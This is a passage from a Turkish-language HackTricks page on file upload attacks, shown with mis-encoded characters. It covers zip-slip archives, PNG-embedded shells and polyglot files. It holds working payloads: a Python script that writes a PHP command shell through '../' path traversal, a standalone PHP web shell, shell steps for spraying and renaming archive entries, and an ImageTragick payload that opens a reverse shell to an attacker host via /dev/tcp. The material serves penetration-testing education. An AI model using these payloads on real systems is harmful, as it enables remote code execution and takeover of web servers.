AyrÄ±ca, **evilarc ile sembolik baÄŸlantÄ± hilesi** bir seÃ§enektir. EÄŸer hedef `/flag.txt` gibi bir dosyaysa, sistemde o dosyaya bir sembolik baÄŸlantÄ± oluÅŸturulmalÄ±dÄ±r. Bu, evilarc'Ä±n iÅŸlemi sÄ±rasÄ±nda hata ile karÅŸÄ±laÅŸmamasÄ±nÄ± saÄŸlar.

AÅŸaÄŸÄ±da, kÃ¶tÃ¼ niyetli bir zip dosyasÄ± oluÅŸturmak iÃ§in kullanÄ±lan Python kodu Ã¶rneÄŸi bulunmaktadÄ±r:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Dosyalama sÄ±kÄ±ÅŸtÄ±rmasÄ±nÄ± kÃ¶tÃ¼ye kullanma**

Daha fazla ayrÄ±ntÄ± iÃ§in **orijinal yayÄ±na bakÄ±n**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **PHP Shell OluÅŸturma**:
KomutlarÄ± `$_REQUEST` deÄŸiÅŸkeni Ã¼zerinden geÃ§iren PHP kodu yazÄ±lÄ±r.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **Dosya Spreyi ve SÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ Dosya OluÅŸturma**:
Birden fazla dosya oluÅŸturulur ve bu dosyalarÄ± iÃ§eren bir zip arÅŸivi oluÅŸturulur.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Hex DÃ¼zenleyici veya vi ile DeÄŸiÅŸtirme**:
Zip iÃ§indeki dosyalarÄ±n isimleri vi veya bir hex dÃ¼zenleyici kullanÄ±larak deÄŸiÅŸtirilir, "xxA" yerine dizinleri gezinmek iÃ§in "../" olarak deÄŸiÅŸtirilir.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

Bu iÃ§eriÄŸi bir resim uzantÄ±sÄ±yla yÃ¼kleyerek zafiyeti sÃ¶mÃ¼rÃ¼n **(ImageMagick , 7.0.1-1)**
([sÃ¶mÃ¼rÃ¼](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG Ä°Ã§ine PHP Shell GÃ¶mme

Bir PNG dosyasÄ±nÄ±n IDAT parÃ§asÄ±na bir PHP shell gÃ¶mmek, belirli gÃ¶rÃ¼ntÃ¼ iÅŸleme iÅŸlemlerini etkili bir ÅŸekilde atlayabilir. PHP-GD'deki `imagecopyresized` ve `imagecopyresampled` iÅŸlevleri Ã¶zellikle ilgili olup, genellikle resimleri yeniden boyutlandÄ±rma ve Ã¶rnekleme iÃ§in kullanÄ±lÄ±rlar. GÃ¶mÃ¼lÃ¼ PHP shell'in bu iÅŸlemlerden etkilenmemesi, belirli kullanÄ±m durumlarÄ± iÃ§in Ã¶nemli bir avantajdÄ±r.

Bu teknik hakkÄ±nda ayrÄ±ntÄ±lÄ± bir keÅŸif, yÃ¶ntemi ve potansiyel uygulamalarÄ± da iÃ§eren aÅŸaÄŸÄ±daki makalede sunulmaktadÄ±r: ["PNG IDAT ParÃ§alarÄ±nda Web Shell Kodlama"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak, sÃ¼recin ve sonuÃ§larÄ±nÄ±n kapsamlÄ± bir anlayÄ±ÅŸÄ±nÄ± sunar.

Daha fazla bilgi iÃ§in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot Dosyalar

Poliglot dosyalar, siber gÃ¼venlikte benzersiz bir araÃ§ olarak hizmet eder ve aynÄ± anda birden fazla dosya formatÄ±nda geÃ§erli olabilen birer kameleon gibi davranÄ±r. Ä°lginÃ§ bir Ã¶rnek, hem bir GIF hem de bir RAR arÅŸivi olarak iÅŸlev gÃ¶ren bir [GIFAR](https://en.wikipedia.org/wiki/Gifar)'dÄ±r. Bu tÃ¼r dosyalar sadece bu eÅŸleÅŸmeyle sÄ±nÄ±rlÄ± deÄŸildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mÃ¼mkÃ¼ndÃ¼r.

Poliglot dosyalarÄ±n temel faydasÄ±, dosyalarÄ± tÃ¼rlerine gÃ¶re tarayan gÃ¼venlik Ã¶nlemlerini atlatma yetenekleridir. Ã‡eÅŸitli uygulamalarda yaygÄ±n olarak kullanÄ±lan bir uygulama, potansiyel olarak zararlÄ± formatlarÄ±n (Ã¶rneÄŸin JS, PHP veya Phar dosyalarÄ±) oluÅŸturduÄŸu riski azaltmak iÃ§in yalnÄ±zca belirli dosya tÃ¼rlerine izin vermektir (Ã¶rneÄŸin JPEG, GIF veya DOC). Bununla birlikte, poliglotlar, birden fazla dosya tÃ¼rÃ¼nÃ¼n yapÄ±sal kriterlerine uyarak bu kÄ±sÄ±tlamalarÄ± gizlice atlayabilirler.

Uyarlanabilirliklerine raÄŸmen, poliglotlar bazÄ± sÄ±nÄ±rlamalarla karÅŸÄ±laÅŸabilir. Ã–rneÄŸin, bir poliglot aynÄ± anda bir PHAR dosyasÄ±nÄ± (PHp ARchive) ve bir JPEG'i temsil edebilirken, yÃ¼klemenin baÅŸarÄ±sÄ± platformun dosya uzantÄ±sÄ± politikalarÄ±na baÄŸlÄ± olabilir. EÄŸer sistem izin verilen uzantÄ±lara sÄ±kÄ± bir ÅŸekilde uymak zorunda ise, poliglotun sadece yapÄ±sal Ã§iftliÄŸi yeterli olmayabilir.

Daha fazla bilgi iÃ§in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referanslar

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Hata Ã¶dÃ¼lÃ¼ ipucu**: **Intigriti'ye kaydolun**, **hackerlar tarafÄ±ndan oluÅŸturulan premium bir hata Ã¶dÃ¼lÃ¼ platformuna**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katÄ±lÄ±n ve **100.000 $'a kadar** Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi paylaÅŸmak iÃ§in PR'lar gÃ¶ndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
